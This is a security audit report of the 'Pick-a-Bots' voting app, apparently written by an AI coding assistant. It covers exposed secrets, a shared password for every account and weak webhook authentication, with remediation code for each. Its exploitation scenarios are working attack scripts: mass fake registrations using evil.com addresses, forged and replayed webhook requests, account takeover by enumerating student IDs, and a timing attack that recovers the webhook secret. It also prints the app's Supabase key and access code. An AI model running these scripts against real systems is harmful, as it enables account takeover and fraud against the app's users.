# Security Audit Report

**Document Version**: 1.0
**Last Updated**: December 2, 2025
**Audit Date**: December 2, 2025
**Severity**: CRITICAL
**Vulnerabilities Found**: 11 (3 Critical, 5 High, 3 Medium)

---

## Executive Summary

This security audit identified **11 security vulnerabilities** in the Pick-a-Bots codebase, with **3 critical-severity issues** requiring immediate attention:

1. **Exposed secrets in version control** (wrangler.toml)
2. **Weak authentication scheme** (shared password for all users)
3. **Vulnerable webhook authentication** (no HMAC verification)

**Risk Level**: 🔴 **CRITICAL**

**Immediate Impact**:
- Database credentials and API keys exposed in public repository
- All user accounts compromised if access code leaks
- Token manipulation possible via webhook exploitation
- No rate limiting exposes system to DDoS and abuse

**Recommendation**: **Fix critical issues within 24-48 hours** before any production deployment.

---

## Table of Contents

1. [Critical Vulnerabilities](#critical-vulnerabilities) (3)
2. [High Severity Vulnerabilities](#high-severity-vulnerabilities) (5)
3. [Medium Severity Vulnerabilities](#medium-severity-vulnerabilities) (3)
4. [Immediate Action Plan](#immediate-action-plan)
5. [Long-term Security Recommendations](#long-term-security-recommendations)
6. [Security Testing Checklist](#security-testing-checklist)

---

## Critical Vulnerabilities

### 🔴 VULN-01: Exposed Secrets in Version Control

**CVSS Score**: 9.1 (CRITICAL)
**CWE**: CWE-798 (Use of Hard-coded Credentials)

#### Vulnerability Details

**Location**: `frontend/wrangler.toml`, lines 23-27, 37-41

**Exposed Secrets**:
```toml
# Development environment (lines 23-27)
[env.dev.vars]
NEXT_PUBLIC_SUPABASE_URL="https://hgjffdonkkisokreoacp.supabase.co"
NEXT_PUBLIC_SUPABASE_PUBLISHABLE_DEFAULT_KEY="sb_publishable_qcwz2j4aNb_pBiq45JB5wg_XBJVR7jz"
ACCESS_CODE="PICKABOTS2025"
WEBHOOK_SECRET="webhook_secret"

# Production environment (lines 37-41)
[env.production.vars]
# SAME SECRETS - no differentiation between dev and prod!
```

#### Impact Analysis

**Severity Justification**:
- **Confidentiality**: HIGH - Database connection details fully exposed
- **Integrity**: HIGH - Attacker can manipulate data via webhooks
- **Availability**: MEDIUM - Account creation can be abused

**Attack Surface**:
1. **Supabase Database Access**:
   - Publishable key allows read access to tables with public RLS policies
   - URL reveals database location and project ID
   - Combined with other leaks, could enable full database access

2. **Unlimited Account Registration**:
   - `ACCESS_CODE` is visible: "PICKABOTS2025"
   - Anyone can register accounts
   - No rate limiting = unlimited fake accounts

3. **Webhook Manipulation**:
   - `WEBHOOK_SECRET` is trivially guessable: "webhook_secret"
   - Attacker can forge webhook requests
   - Can manipulate user token balances

4. **Git History Exposure**:
   - Secrets exist in ALL historical commits
   - Cannot be removed without rewriting git history
   - If repo ever made public, all secrets are permanently compromised

#### Exploitation Scenario

```bash
# Step 1: Clone repository (or view on GitHub if public)
git clone https://github.com/your-org/pick-a-bot-2025

# Step 2: Extract secrets
cat frontend/wrangler.toml

# Step 3: Register unlimited accounts
for i in {1..1000}; do
  curl -X POST https://your-app.com/api/join \
    -H "Content-Type: application/json" \
    -d "{
      \"email\": \"attacker$i@evil.com\",
      \"displayName\": \"Bot$i\",
      \"zid\": \"z000000$i\",
      \"accessCode\": \"PICKABOTS2025\"
    }"
done

# Step 4: Manipulate tokens via webhook
curl -X POST https://your-app.com/api/user/update-tokens \
  -H "x-webhook-secret: webhook_secret" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "INSERT",
    "table": "match",
    "record": {
      "id": "fake-match-id",
      "winner": "bot1"
    }
  }'

# Step 5: Query database directly (if full credentials leaked)
psql "postgresql://postgres:PASSWORD@hgjffdonkkisokreoacp.supabase.co:5432/postgres" \
  -c "SELECT * FROM \"user\" WHERE tokens > 1000;"
```

#### Remediation Steps

**Immediate (Next 1 hour)**:

1. **Rotate ALL secrets**:
   ```bash
   # Go to Supabase dashboard
   # Project Settings → API → Reset Keys

   # Generate new access code
   echo "New access code: PICKABOTS2025_$(openssl rand -hex 16)"

   # Generate new webhook secret
   echo "New webhook secret: $(openssl rand -hex 32)"
   ```

2. **Remove secrets from wrangler.toml**:
   ```toml
   # wrangler.toml - REMOVE all secret values
   [env.dev.vars]
   # Set these in Cloudflare dashboard instead
   NEXT_PUBLIC_SUPABASE_URL=""
   NEXT_PUBLIC_SUPABASE_PUBLISHABLE_DEFAULT_KEY=""
   ACCESS_CODE=""
   WEBHOOK_SECRET=""
   ```

3. **Use Wrangler secrets**:
   ```bash
   # Set via CLI (encrypted, not in git)
   wrangler secret put ACCESS_CODE --env production
   wrangler secret put WEBHOOK_SECRET --env production
   wrangler secret put SUPABASE_SERVICE_ROLE_KEY --env production
   ```

4. **Commit and push changes**:
   ```bash
   git add frontend/wrangler.toml
   git commit -m "security: remove exposed secrets from wrangler.toml"
   git push
   ```

**Long-term (Next week)**:

5. **Clean git history** (if repository is or will be public):
   ```bash
   # Use BFG Repo-Cleaner to remove secrets from history
   brew install bfg
   bfg --replace-text secrets.txt
   git reflog expire --expire=now --all
   git gc --prune=now --aggressive
   git push --force
   ```

6. **Add pre-commit hook** to prevent future leaks:
   ```bash
   # Install git-secrets
   brew install git-secrets

   # Setup hooks
   git secrets --install
   git secrets --register-aws
   git secrets --add 'supabase\.co'
   git secrets --add 'sb_[a-zA-Z0-9_]+'
   ```

7. **Use environment variable validation**:
   ```typescript
   // lib/env.ts
   import { z } from 'zod';

   const envSchema = z.object({
     NEXT_PUBLIC_SUPABASE_URL: z.string().url(),
     ACCESS_CODE: z.string().min(16),
     WEBHOOK_SECRET: z.string().min(32),
   });

   // Throws error if env vars missing or invalid
   export const env = envSchema.parse(process.env);
   ```

#### Verification

After remediation, verify:

```bash
# 1. Check wrangler.toml has no secret values
grep -E "(API|KEY|SECRET|PASSWORD)" frontend/wrangler.toml

# 2. Check secrets are in Cloudflare
wrangler secret list --env production

# 3. Try accessing app without secrets (should fail)
curl -X POST https://your-app.com/api/join \
  -H "Content-Type: application/json" \
  -d '{"accessCode": "PICKABOTS2025"}'
# Expected: 403 Forbidden (old code no longer works)

# 4. Audit git history
git log --all --full-history --source -- "*wrangler.toml" | grep -i "key\|secret"
```

---

### 🔴 VULN-02: Weak Authentication Scheme

**CVSS Score**: 8.5 (CRITICAL)
**CWE**: CWE-798 (Use of Hard-coded Credentials), CWE-287 (Improper Authentication)

#### Vulnerability Details

**Location**: `frontend/src/services/auth.ts`, lines 5-51

**Code**:
```typescript
// Line 5: Single shared password for ALL users
const REQUIRED_ACCESS_CODE = process.env.NEXT_PUBLIC_ACCESS_CODE;

// Lines 22-27: Registration uses shared password
export const signUp = async (params: SignUpParams) => {
  const { data, error } = await supabase.auth.signUp({
    email,
    password: REQUIRED_ACCESS_CODE,  // ← Same for EVERYONE!
    options: { data: { name: displayName, zid: zid.toUpperCase() } },
  });
};

// Lines 33-37: Login uses shared password
export const signIn = async (email: string) => {
  const { data, error } = await supabase.auth.signInWithPassword({
    email,
    password: REQUIRED_ACCESS_CODE,  // ← Same for EVERYONE!
  });
};
```

#### Impact Analysis

**Why This Is Critical**:

1. **Single Point of Failure**:
   - ONE password compromised = ALL accounts compromised
   - Already happened in VULN-01 (exposed in git)

2. **No Account Isolation**:
   - Cannot revoke access for individual users
   - If one user is malicious, must change password for ALL users
   - Mass password reset affects all users simultaneously

3. **Password Cannot Be Changed**:
   - Users cannot set their own passwords
   - No password reset functionality
   - Violates OWASP authentication guidelines

4. **Enables Account Takeover**:
   - Attacker who knows `ACCESS_CODE` can login as ANY user
   - Only needs to know victim's email (often public: z1234567@unsw.edu.au)

#### Exploitation Scenario

```javascript
// Scenario: Attacker learned ACCESS_CODE = "PICKABOTS2025" from git

// Step 1: Enumerate valid emails (zIDs are sequential)
const victims = [];
for (let i = 1000000; i <= 9999999; i++) {
  const email = `z${i}@unsw.edu.au`;

  // Try to login
  const { data, error } = await supabase.auth.signInWithPassword({
    email,
    password: "PICKABOTS2025",
  });

  if (!error) {
    victims.push(email);
    console.log(`Found account: ${email}`);
  }
}

// Step 2: Login as victim and steal their tokens
for (const email of victims) {
  await supabase.auth.signInWithPassword({
    email,
    password: "PICKABOTS2025",
  });

  // Now authenticated as victim
  // Can vote with their tokens, change their name, etc.
  const { data: user } = await supabase.from('user').select('tokens').single();
  console.log(`${email} has ${user.tokens} tokens - stealing!`);

  // Vote to drain their tokens
  await fetch('/api/vote', {
    method: 'POST',
    body: JSON.stringify({
      matchId: 'current-match',
      botChosen: 'bot1',
      tokensUsed: user.tokens,  // Bet all their tokens
    }),
  });
}
```

#### Remediation Steps

**Option A: Per-User Passwords (Recommended)**

```typescript
// 1. Add password_hash column to user table
// database/src/db/schema/user.ts
export const user = pgTable("user", {
  id: uuid("id").primaryKey().defaultRandom(),
  email: text("email").notNull().unique(),
  passwordHash: text("password_hash").notNull(),  // ADD THIS
  name: text("name").notNull(),
  zid: text("zid").notNull().unique(),
  tokens: integer("tokens").notNull().default(100),
  createdAt: timestamp("created_at").notNull().defaultNow(),
  lastPasswordChange: timestamp("last_password_change"),  // ADD THIS
});

// 2. Update registration
// services/auth.ts
import { hash } from 'bcrypt';

export const signUp = async (params: SignUpParams) => {
  const { email, displayName, zid, password, accessCode } = params;

  // Step 1: Verify access code (separate from user password)
  if (accessCode !== process.env.ACCESS_CODE) {
    throw new Error("Invalid access code");
  }

  // Step 2: Hash user's individual password
  const passwordHash = await hash(password, 10);

  // Step 3: Create user in database
  const { data: user, error } = await supabase
    .from('user')
    .insert({
      email,
      name: displayName,
      zid: zid.toUpperCase(),
      password_hash: passwordHash,
      last_password_change: new Date().toISOString(),
    })
    .select()
    .single();

  if (error) throw error;

  // Step 4: Generate JWT token (replace Supabase auth)
  const token = await generateJWT({ userId: user.id });

  return { user, token };
};

// 3. Update login
import { verify } from 'bcrypt';

export const signIn = async (email: string, password: string) => {
  // Fetch user from database
  const { data: user, error } = await supabase
    .from('user')
    .select('id, email, name, password_hash')
    .eq('email', email)
    .single();

  if (error || !user) {
    throw new Error("Invalid credentials");
  }

  // Verify password
  const isValid = await verify(password, user.password_hash);
  if (!isValid) {
    throw new Error("Invalid credentials");
  }

  // Generate JWT token
  const token = await generateJWT({ userId: user.id });

  return { user, token };
};

// 4. JWT token generation
import { SignJWT } from 'jose';

async function generateJWT(payload: { userId: string }): Promise<string> {
  const secret = new TextEncoder().encode(process.env.JWT_SECRET);

  return await new SignJWT(payload)
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('7d')
    .sign(secret);
}
```

**Option B: Magic Links (Simpler, No Passwords)**

```typescript
// services/auth.ts
export const signUp = async (params: SignUpParams) => {
  const { email, displayName, zid, accessCode } = params;

  // Verify access code
  if (accessCode !== process.env.ACCESS_CODE) {
    throw new Error("Invalid access code");
  }

  // Create user without password
  const { data: user } = await supabase
    .from('user')
    .insert({
      email,
      name: displayName,
      zid: zid.toUpperCase(),
    })
    .select()
    .single();

  // Send magic link to email
  await sendMagicLink(email);

  return { message: "Check your email for login link" };
};

async function sendMagicLink(email: string) {
  // Generate one-time token
  const token = await generateMagicLinkToken(email);

  // Send email
  await sendEmail({
    to: email,
    subject: "Login to Pick-a-Bots",
    body: `Click to login: https://your-app.com/auth/verify?token=${token}`,
  });
}
```

#### Verification

```bash
# Test that old shared password no longer works
curl -X POST https://your-app.com/api/join \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "user-specific-password",
    "accessCode": "PICKABOTS2025_newcode"
  }'

# Verify users have different passwords
psql "$DATABASE_URL" -c "SELECT email, password_hash FROM \"user\" LIMIT 5;"
# Should show different hashes for each user
```

---

### 🔴 VULN-03: Vulnerable Webhook Authentication

**CVSS Score**: 8.7 (CRITICAL)
**CWE**: CWE-345 (Insufficient Verification of Data Authenticity), CWE-294 (Authentication Bypass)

#### Vulnerability Details

**Location**: `frontend/src/app/api/user/update-tokens/route.ts`, lines 14-17

**Code**:
```typescript
// Lines 14-17: Simple header check, NO signature verification
const webhookSecret = request.headers.get("x-webhook-secret");
if (webhookSecret !== process.env.WEBHOOK_SECRET) {
  return NextResponse.json({ error: "Unauthorized" }, { status: 403 });
}

// Lines 59-150: Process webhook without additional verification
// No timestamp check, no signature, no idempotency
```

#### Impact Analysis

**Why This Is Critical**:

1. **No Cryptographic Verification**:
   - Simple string comparison can be bypassed
   - No HMAC signature to verify request came from Supabase
   - Attacker can forge requests

2. **Replay Attack Vulnerability**:
   - No timestamp validation
   - Attacker can capture legitimate webhook and replay it 100+ times
   - Users get tokens credited multiple times for same match

3. **No Idempotency**:
   - No tracking of processed webhook IDs
   - Same webhook can be processed multiple times
   - Causes data inconsistency

4. **Timing Attack Possible**:
   - String comparison leaks information byte-by-byte
   - Attacker can brute-force the webhook secret

#### Exploitation Scenario

**Attack 1: Direct Forgery**
```bash
# If attacker knows webhook secret (from VULN-01)
curl -X POST https://your-app.com/api/user/update-tokens \
  -H "x-webhook-secret: webhook_secret" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "INSERT",
    "table": "match",
    "record": {
      "id": "fake-match-id-123",
      "winner": "bot1",
      "state": "complete"
    }
  }'

# This processes fake match results, crediting tokens to users who voted
```

**Attack 2: Replay Attack**
```bash
# Step 1: Intercept legitimate webhook (e.g., via man-in-the-middle)
# Captured request:
POST /api/user/update-tokens
x-webhook-secret: webhook_secret
{
  "type": "INSERT",
  "table": "match",
  "record": {
    "id": "real-match-789",
    "winner": "bot2"
  }
}

# Step 2: Replay captured request 100 times
for i in {1..100}; do
  curl -X POST https://your-app.com/api/user/update-tokens \
    -H "x-webhook-secret: webhook_secret" \
    -H "Content-Type: application/json" \
    -d @captured-webhook.json
done

# Result: Users who voted correctly get tokens credited 100 times!
```

**Attack 3: Timing Attack**
```python
# Brute-force webhook secret byte-by-byte
import requests
import time
import string

url = "https://your-app.com/api/user/update-tokens"
known = ""

for position in range(32):  # Assume 32-byte secret
    best_char = None
    max_time = 0

    for char in string.printable:
        test_secret = known + char + "X" * (31 - position)

        start = time.time()
        requests.post(url, headers={"x-webhook-secret": test_secret})
        elapsed = time.time() - start

        if elapsed > max_time:
            max_time = elapsed
            best_char = char

    known += best_char
    print(f"Found: {known}")

# After ~32 * 100 = 3,200 requests, webhook secret is revealed
```

#### Remediation Steps

**Implement HMAC Signature Verification**:

```typescript
// lib/webhook-security.ts
import { createHmac, timingSafeEqual } from 'crypto';

export function verifyWebhookSignature(
  payload: string,
  signature: string,
  secret: string
): boolean {
  // Compute expected signature using HMAC-SHA256
  const hmac = createHmac('sha256', secret);
  hmac.update(payload);
  const expectedSignature = hmac.digest('hex');

  // Timing-safe comparison (prevents timing attacks)
  try {
    const signatureBuffer = Buffer.from(signature, 'hex');
    const expectedBuffer = Buffer.from(expectedSignature, 'hex');

    // Lengths must match
    if (signatureBuffer.length !== expectedBuffer.length) {
      return false;
    }

    return timingSafeEqual(signatureBuffer, expectedBuffer);
  } catch {
    return false;
  }
}

export function validateWebhookTimestamp(
  timestamp: number,
  maxAgeSeconds: number = 300  // 5 minutes
): boolean {
  const now = Math.floor(Date.now() / 1000);
  const age = now - timestamp;

  // Reject if timestamp is in future or too old
  return age >= 0 && age <= maxAgeSeconds;
}

// In-memory store for processed webhooks (use Redis in production)
const processedWebhooks = new Map<string, number>();

export function isWebhookProcessed(webhookId: string): boolean {
  return processedWebhooks.has(webhookId);
}

export function markWebhookProcessed(webhookId: string): void {
  processedWebhooks.set(webhookId, Date.now());

  // Clean up after 1 hour
  setTimeout(() => {
    processedWebhooks.delete(webhookId);
  }, 3600000);
}
```

**Update API Route**:
```typescript
// app/api/user/update-tokens/route.ts
import {
  verifyWebhookSignature,
  validateWebhookTimestamp,
  isWebhookProcessed,
  markWebhookProcessed,
} from '@/lib/webhook-security';

export async function POST(request: Request) {
  // Get signature and metadata from headers
  const signature = request.headers.get("x-webhook-signature");
  const timestamp = parseInt(request.headers.get("x-webhook-timestamp") || "0");
  const webhookId = request.headers.get("x-webhook-id");

  // Validate headers present
  if (!signature || !timestamp || !webhookId) {
    return NextResponse.json(
      { error: "Missing webhook headers" },
      { status: 400 }
    );
  }

  // Read body once
  const body = await request.text();

  // Verify HMAC signature
  const isValidSignature = verifyWebhookSignature(
    body,
    signature,
    process.env.WEBHOOK_SECRET!
  );

  if (!isValidSignature) {
    console.warn("Invalid webhook signature");
    return NextResponse.json(
      { error: "Invalid signature" },
      { status: 403 }
    );
  }

  // Validate timestamp (prevent replay attacks)
  const isValidTimestamp = validateWebhookTimestamp(timestamp, 300);
  if (!isValidTimestamp) {
    console.warn("Webhook timestamp too old or invalid");
    return NextResponse.json(
      { error: "Timestamp too old" },
      { status: 403 }
    );
  }

  // Check idempotency (prevent duplicate processing)
  if (isWebhookProcessed(webhookId)) {
    console.info(`Webhook ${webhookId} already processed`);
    return NextResponse.json(
      { success: true, message: "Already processed" },
      { status: 200 }
    );
  }

  // Mark as processed BEFORE doing work (atomic operation)
  markWebhookProcessed(webhookId);

  try {
    // Parse payload
    const payload = JSON.parse(body);

    // Process webhook
    await processWebhook(payload);

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Webhook processing failed:", error);
    return NextResponse.json(
      { error: "Processing failed" },
      { status: 500 }
    );
  }
}
```

**Configure Supabase Webhook**:
```sql
-- In Supabase dashboard, configure webhook:
-- URL: https://your-app.com/api/user/update-tokens
-- Secret: [Your 32-byte hex secret from Secrets Manager]
-- Headers:
--   x-webhook-signature: {{signature}}
--   x-webhook-timestamp: {{timestamp}}
--   x-webhook-id: {{id}}
```

#### Verification

```bash
# Test 1: Valid webhook (should succeed)
PAYLOAD='{"type":"INSERT","table":"match"}'
TIMESTAMP=$(date +%s)
WEBHOOK_ID=$(uuidgen)
SIGNATURE=$(echo -n "$PAYLOAD" | openssl dgst -sha256 -hmac "$WEBHOOK_SECRET" | cut -d' ' -f2)

curl -X POST https://your-app.com/api/user/update-tokens \
  -H "x-webhook-signature: $SIGNATURE" \
  -H "x-webhook-timestamp: $TIMESTAMP" \
  -H "x-webhook-id: $WEBHOOK_ID" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD"
# Expected: 200 OK

# Test 2: Invalid signature (should fail)
curl -X POST https://your-app.com/api/user/update-tokens \
  -H "x-webhook-signature: invalid_signature" \
  -H "x-webhook-timestamp: $TIMESTAMP" \
  -H "x-webhook-id: $(uuidgen)" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD"
# Expected: 403 Forbidden

# Test 3: Replay attack (should be rejected)
curl -X POST https://your-app.com/api/user/update-tokens \
  -H "x-webhook-signature: $SIGNATURE" \
  -H "x-webhook-timestamp: $TIMESTAMP" \
  -H "x-webhook-id: $WEBHOOK_ID" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD"
# Expected: 200 OK with "Already processed" message

# Test 4: Old timestamp (should be rejected)
OLD_TIMESTAMP=$(($(date +%s) - 600))  # 10 minutes ago
curl -X POST https://your-app.com/api/user/update-tokens \
  -H "x-webhook-signature: $SIGNATURE" \
  -H "x-webhook-timestamp: $OLD_TIMESTAMP" \
  -H "x-webhook-id: $(uuidgen)" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD"
# Expected: 403 Forbidden with "Timestamp too old"
```

---

## High Severity Vulnerabilities

### 🟠 VULN-04: Missing Rate Limiting

**CVSS Score**: 7.8 (HIGH)
**CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-770 (Allocation of Resources Without Limits)

#### Vulnerability Details

**Location**: All API routes (`frontend/src/app/api/*`)

**Affected Endpoints**:
- `/api/vote` - Unlimited vote attempts
- `/api/join` - Unlimited account creation
- `/api/leaderboard` - Unlimited data scraping
- `/api/user/vote-history` - Unlimited data extraction
- `/api/user/update-tokens` - Unlimited webhook calls (compounded with VULN-03)

#### Impact Analysis

**Attack Scenarios**:

1. **Account Creation Spam**:
   ```bash
   # Create 10,000 fake accounts
   for i in {1..10000}; do
     curl -X POST https://your-app.com/api/join \
       -H "Content-Type: application/json" \
       -d "{\"email\":\"spam$i@evil.com\",\"accessCode\":\"PICKABOTS2025\"}" &
   done
   # Database filled with garbage, legitimate users can't register
   ```

2. **Vote Manipulation**:
   ```bash
   # Submit 1000 votes in 10 seconds
   for i in {1..1000}; do
     curl -X POST https://your-app.com/api/vote \
       -H "Authorization: Bearer $TOKEN" \
       -d "{\"matchId\":\"$MATCH\",\"botChosen\":\"bot1\",\"tokens\":50}" &
   done
   # Overwhelms database, legitimate votes may be rejected
   ```

3. **Data Scraping**:
   ```bash
   # Scrape leaderboard every second
   while true; do
     curl https://your-app.com/api/leaderboard > leaderboard_$(date +%s).json
     sleep 1
   done
   # Extracts all user data, high data transfer costs
   ```

#### Remediation

**Implement Upstash Redis Rate Limiting**:

```bash
# Install Upstash Rate Limit
bun add @upstash/ratelimit @upstash/redis
```

```typescript
// lib/ratelimit.ts
import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL!,
  token: process.env.UPSTASH_REDIS_REST_TOKEN!,
});

// Different rate limits for different endpoints
export const voteRateLimit = new Ratelimit({
  redis,
  limiter: Ratelimit.slidingWindow(10, "1 m"),  // 10 requests per minute
  analytics: true,
});

export const joinRateLimit = new Ratelimit({
  redis,
  limiter: Ratelimit.slidingWindow(3, "1 h"),  // 3 registrations per hour
  analytics: true,
});

export const leaderboardRateLimit = new Ratelimit({
  redis,
  limiter: Ratelimit.slidingWindow(60, "1 m"),  // 60 requests per minute
  analytics: true,
});

// Usage in API route
import { voteRateLimit } from '@/lib/ratelimit';

export async function POST(request: Request) {
  const ip = request.headers.get('x-forwarded-for') || 'unknown';

  const { success, limit, remaining, reset } = await voteRateLimit.limit(ip);

  if (!success) {
    return NextResponse.json(
      { error: "Too many requests" },
      {
        status: 429,
        headers: {
          'X-RateLimit-Limit': String(limit),
          'X-RateLimit-Remaining': String(remaining),
          'X-RateLimit-Reset': String(reset),
          'Retry-After': String(Math.ceil((reset - Date.now()) / 1000)),
        },
      }
    );
  }

  // Process request...
}
```

**Cost**: Upstash Redis free tier covers 10,000 requests/day

---

### 🟠 VULN-05-08: Additional High Severity Issues

See **IMPROVEMENTS-AND-RECOMMENDATIONS.md** for full details on:
- **VULN-05**: Race condition in current_match updates (HIGH-03)
- **VULN-06**: Race condition in token balance updates (HIGH-04)
- **VULN-07**: Memory leak in Supabase subscriptions (HIGH-05)
- **VULN-08**: Missing input validation on token updates (HIGH-01)

---

## Medium Severity Vulnerabilities

### 🟡 VULN-09: Weak Admin API Authentication

**CVSS Score**: 6.5 (MEDIUM)
**Location**: `cron/src/middleware/apiAuth.ts`

See **IMPROVEMENTS-AND-RECOMMENDATIONS.md** MEDIUM-01 for full details.

### 🟡 VULN-10: Missing CSRF Protection

**CVSS Score**: 6.1 (MEDIUM)
**Location**: All POST endpoints

See **IMPROVEMENTS-AND-RECOMMENDATIONS.md** MEDIUM-02 for full details.

### 🟡 VULN-11: RLS Policy Gaps

**CVSS Score**: 5.5 (MEDIUM)
**Location**: `database/src/supabase/policies.sql`

See **IMPROVEMENTS-AND-RECOMMENDATIONS.md** MEDIUM-03 for full details.

---

## Immediate Action Plan

### Priority 1: Fix Critical Issues (Next 24-48 Hours)

**Total Time**: ~8 hours

#### Hour 1: Rotate Secrets
- [ ] Change `ACCESS_CODE` to strong random string
- [ ] Change `WEBHOOK_SECRET` to 32-byte hex string
- [ ] Rotate Supabase API keys
- [ ] Move secrets to Cloudflare dashboard (Wrangler secrets)
- [ ] Commit changes, remove secrets from wrangler.toml

#### Hours 2-4: Implement Webhook HMAC
- [ ] Install crypto library
- [ ] Implement HMAC signature verification
- [ ] Add timestamp validation
- [ ] Add idempotency tracking
- [ ] Update API route with new logic
- [ ] Configure Supabase webhook with new headers
- [ ] Test valid/invalid signatures

#### Hours 5-8: Implement Proper Authentication
- [ ] Add `password_hash` column to user table
- [ ] Implement bcrypt password hashing
- [ ] Update registration flow
- [ ] Update login flow
- [ ] Implement JWT token generation
- [ ] Test with multiple users
- [ ] Verify old shared password no longer works

### Priority 2: High Severity (Next 1-2 Weeks)

- [ ] Implement rate limiting (2 hours)
- [ ] Fix race conditions (3 hours)
- [ ] Add database indexes (1 hour)
- [ ] Add error boundaries (1 hour)
- [ ] Fix memory leak in hooks (1 hour)
- [ ] Setup error monitoring (2 hours)

---

## Long-term Security Recommendations

### 1. Security Headers

Add to Next.js configuration:

```typescript
// next.config.js
const securityHeaders = [
  {
    key: 'X-DNS-Prefetch-Control',
    value: 'on',
  },
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=63072000; includeSubDomains; preload',
  },
  {
    key: 'X-Frame-Options',
    value: 'SAMEORIGIN',
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff',
  },
  {
    key: 'X-XSS-Protection',
    value: '1; mode=block',
  },
  {
    key: 'Referrer-Policy',
    value: 'origin-when-cross-origin',
  },
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "font-src 'self' data:",
      "connect-src 'self' https:",
    ].join('; '),
  },
];

module.exports = {
  async headers() {
    return [{
      source: '/:path*',
      headers: securityHeaders,
    }];
  },
};
```

### 2. Automated Security Scanning

```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      # Dependency vulnerability scanning
      - name: Run npm audit
        run: npm audit --audit-level=moderate

      # Secret scanning
      - name: Scan for secrets
        uses: trufflesecurity/trufflehog@main

      # SAST (Static Application Security Testing)
      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1

      # Container scanning (if using Docker)
      - name: Run Trivy
        uses: aquasecurity/trivy-action@master
```

### 3. Penetration Testing

Before production launch:
- [ ] Hire professional penetration testers
- [ ] Perform OWASP Top 10 testing
- [ ] Load testing with 500+ concurrent users
- [ ] Verify all fixes from this audit

### 4. Security Monitoring

- [ ] Setup Sentry for error tracking
- [ ] Configure CloudWatch alerts for suspicious activity
- [ ] Monitor failed login attempts
- [ ] Track API rate limit violations
- [ ] Set up log aggregation (CloudWatch Logs Insights)

---

## Security Testing Checklist

Before production deployment, verify:

### Authentication & Authorization
- [ ] Old shared password no longer works
- [ ] Users have individual passwords
- [ ] Passwords are properly hashed (bcrypt, 10+ rounds)
- [ ] JWT tokens expire after 7 days
- [ ] Invalid tokens are rejected
- [ ] Users can only access their own data

### API Security
- [ ] All secrets removed from git
- [ ] Secrets stored in Secrets Manager or Wrangler
- [ ] Webhook signatures verified with HMAC
- [ ] Timestamp validation prevents replay attacks
- [ ] Rate limiting blocks excessive requests
- [ ] CSRF tokens required for state-changing operations

### Data Protection
- [ ] RLS policies prevent unauthorized access
- [ ] Database connections use TLS
- [ ] Sensitive data encrypted at rest
- [ ] No PII in logs

### Infrastructure
- [ ] MFA enabled on AWS account
- [ ] IAM roles follow least privilege
- [ ] Security groups restrict access
- [ ] Database not publicly accessible (production)
- [ ] Automated backups enabled

### Monitoring
- [ ] Error tracking configured (Sentry/CloudWatch)
- [ ] Alerts for critical errors
- [ ] Logging captures security events
- [ ] Performance monitoring enabled

---

## Conclusion

This security audit identified **11 vulnerabilities**, with **3 critical issues** requiring immediate remediation:

1. **Exposed secrets** (rotate and move to secure storage)
2. **Weak authentication** (implement per-user passwords or magic links)
3. **Vulnerable webhooks** (add HMAC signature verification)

**Estimated Remediation Time**: 8-12 hours for critical issues, 20+ hours for all issues.

**Risk Assessment**: **CRITICAL** - Do not deploy to production until critical issues are fixed.

**Next Steps**:
1. Fix critical issues within 24-48 hours
2. Review with team and prioritize high-severity issues
3. Implement long-term security recommendations
4. Consider AWS rebuild (see FUTURE-PLANS.md) for better security foundation

---

**Audit Performed By**: Claude Code (Anthropic)
**Date**: December 2, 2025
**Version**: 1.0
